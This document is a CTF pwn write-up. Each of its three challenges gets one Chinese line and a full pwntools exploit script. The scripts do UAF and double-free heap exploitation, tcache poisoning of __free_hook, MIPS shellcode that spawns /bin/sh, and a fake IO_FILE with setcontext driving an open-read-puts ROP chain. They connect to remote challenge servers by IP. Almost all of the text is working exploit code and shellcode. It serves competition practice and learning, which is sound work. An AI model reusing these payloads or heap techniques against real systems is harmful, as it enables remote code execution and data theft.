### easyKooc
mips pwn,UAF漏洞,给了stack地址,利用edit处leak出canary,然后double free申请到栈上修改返回地址为堆地址,提前在堆上布置shellcode
```python
from pwn import*
context.binary = './main'
#context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('choice',str(ch))
def new(idx,content):
	menu(1)
	p.sendlineafter('id',str(idx))
	p.sendafter('content',content)
def free(index):
	menu(2)
	p.sendlineafter('id!',str(index))
def message(mess):
	menu(3)
	p.sendafter('?',mess)
#p = process('qemu-mipsel -g 1234 -L . ./main.bak',shell=True)
#p = process('qemu-mipsel -L . ./main.bak',shell=True)
p = remote('121.36.166.138',8889)
libc =ELF('./libc-2.23.so')
p.sendafter('motto!','FMYY')
p.recvuntil('gift for you: ')
stack = int(p.recv(10),16) +  0x20
log.info('Stack:\t' + hex(stack))
message('F'*(0x21-4) + 'FMYY')
p.recvuntil('FMYY')
canary = u32(p.recv(3).rjust(4,'\x00'))
log.info('Canary:\t' + hex(canary))
message('\x00'*0x18 + 'FMYY' + p32(0x41) + '\x00')
shellcode  = ""
shellcode += "\xFF\xFF\x10\x04\xAB\x0F\x02\x24"
shellcode += "\x55\xF0\x46\x20\x66\x06\xFF\x23"
shellcode += "\xC2\xF9\xEC\x23\x66\x06\xBD\x23"
shellcode += "\x9A\xF9\xAC\xAF\x9E\xF9\xA6\xAF"
shellcode += "\x9A\xF9\xBD\x23\x21\x20\x80\x01"
shellcode += "\x21\x28\xA0\x03\xCC\xCD\x44\x03"
shellcode += "/bin/sh"
new(1,'FMYY')
new(2,'FMYY')
free(1)
free(2)
free(1)
new(3,p32(stack))
new(4,'\x00')
p.recvuntil('is: ')
heap_base = u32(p.recv(3).ljust(4,'\x00'))
log.info('HEAP:\t' + hex(heap_base))
new(5,shellcode)
new(6,p32(canary) + p32(0) + p32(heap_base + 0x78))
menu(4)
p.interactive()
```

### seven hero
realloc导致UAF,当size=0的时候 就是一个free的效果,先利用gift位置leak 出libc,然后tcache poisoning 攻击free_hook即可
```python
from pwn import*
context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('choice:',str(ch))
def new(index,size,content):
	menu(1)
	p.sendlineafter('index:',str(index))
	p.sendlineafter('size:',str(size))
	p.sendafter('content:',content)
def free(index):
	menu(3)
	p.sendlineafter('index:',str(index))
def edit(index,size,content):
	menu(2)
	p.sendlineafter('index:',str(index))
	p.sendlineafter('size:',str(size))
	p.sendafter('content:',content)
def show(index):
	menu(4)
	p.sendlineafter('index',str(index))
def F(index):
	menu(2)
	p.sendlineafter('index:',str(index))
	p.sendlineafter('size:',str(0))
p = process('./main')
p = remote('119.3.89.93',8011)
libc =ELF('./libc-2.29.so')
for i in range(9):
	new(i,0x10,'FMYY')
for i in range(7):
	free(8 - i)
F(0)
F(1)
edit(1,0x10,'\x50')
new(2,0x10,'FMYY')
new(3,0x10,'/bin/sh\x00')
menu(666)
p.recvuntil('there is a gift: ')
libc_base = int(p.recv(14),16)  - libc.sym['printf'] - 0x201910
log.info('LIBC:\t' + hex(libc_base))
p.sendline('FMYY')
new(4,0x50,'FMYY')
F(4)
edit(4,0x50,'\x00'*0x10)
F(4)
menu(666)
p.sendline(p64(libc_base + libc.sym['__free_hook']))
menu(666)
p.sendline('FMYY')
menu(666)
p.sendline(p64(libc_base + libc.sym['system']))
free(3)
p.interactive()
```
### manager
add申请的时候,如果size不符合条件,会返回,而edit的时候,没有检测,所以通过残留信息来控制指针,实现任意写
```python
from pwn import*
#context.log_level = 'DEBUG'
context.binary = './main'
def init(string1,string2):
	p.sendafter('Input String1:',string1)
	p.sendafter('Input String2:',string2)
def menu(ch):
	p.sendlineafter('>>>',str(ch))
def new(name,index,size,content,sign=1):
	menu(1)
	p.sendafter('Input Name of Staff:',name)
	p.sendlineafter('Input Number of Staff:',str(index))
	p.sendlineafter('Input len of Info:',str(size))
	p.sendafter('get Info:',content)
def rename(index,name):
	menu(2)
	p.sendlineafter('Input Number:',str(index))
	p.sendlineafter('Info','1')
	p.sendafter('name:',name)
def reinfo(index,size,content):
	menu(2)
	p.sendlineafter('Input Number:',str(index))
	p.sendlineafter('Info','2')
	p.sendlineafter('Input len of Info:',str(size))
	p.sendafter('info:',content)
def free(index):
	menu(3)
	p.sendlineafter('Input Number of Staff:',str(index))
def show(index):
	menu(4)
	p.sendlineafter('Input staff number:',str(index))
p = process('./main')
p = remote('122.112.231.25',8005)
libc =ELF('./libc-2.23.so')
init('\x01F\n','\x02!\n')
new('fmyy',0,0x80,'FMYY')
new('fmyy',1,0x80,'FMYY')
new('fmyy',2,0x10,'FMYY')
free(1)
free(0)
new('FMYYSSSS',0,0x40,'\xA0')
show(0)
p.recvuntil('FMYYSSSS')
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x60
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x90
log.info('HEAP:\t' + hex(heap_base))
log.info('LIBC:\t' + hex(libc_base))
new('fmyy',1,0x20,'FMYY')
####################################
free_hook = libc_base + libc.sym['__free_hook']

pop_rdi_ret = libc_base + 0x0000000000021112
pop_rsi_ret = libc_base + 0x00000000000202F8
pop_rdx_ret = libc_base + 0x0000000000001B92
syscall = libc_base + libc.sym['syscall'] + 23

Open = libc_base + libc.symbols["open"]
Read = libc_base + libc.symbols["read"]
Puts = libc_base + libc.symbols['puts']
IO_str_jumps = libc_base + 0x3C37A0
ret  = libc_base + 0x937
fake_IO_FILE  = p64(0) + p64(0)
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(heap_base + 0x520)
fake_IO_FILE  = fake_IO_FILE.ljust(0xC8,'\x00')
fake_IO_FILE += p64(IO_str_jumps - 8)
fake_IO_FILE += p64(0) + p64(libc_base + libc.sym['setcontext'] + 53)

orw  = p64(pop_rdi_ret)+p64(heap_base + 0x778)
orw += p64(pop_rsi_ret)+p64(0)
orw += p64(Open)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rdx_ret) + p64(0x30)
orw += p64(pop_rsi_ret) + p64(heap_base)
orw += p64(Read)
orw += p64(pop_rdi_ret) + p64(heap_base)
orw += p64(Puts)
orw  = orw.ljust(0xE8,'\x00')
orw += './flag\x00\x00'


frame = SigreturnFrame()
frame.rsp = heap_base + 0x690
frame.rip = ret

####################################

new(p64(heap_base) + p64(0x100),3,0x38,'\x00'*0x30 + p64(heap_base + 0x310))
reinfo(3,0x10,'FMYY')

menu(1)
p.sendafter('Input Name of Staff:',p64(heap_base + 0x2F0) + p64(0x10))
p.sendlineafter('Input Number of Staff:','4')
p.sendlineafter('Input len of Info:',str(0x101))
new('fmyy',5,0x100,fake_IO_FILE)
reinfo(4,0x10,p64(free_hook))
rename(4,p64(libc_base + libc.sym['exit']))

reinfo(4,0x10,p64(libc_base+libc.symbols['_IO_list_all']))
rename(4,p64(heap_base + 0x3A0))

new('fmyy',6,0x100,str(frame))
new('fmyy',7,0x100,orw)
free(0)
p.interactive()
```
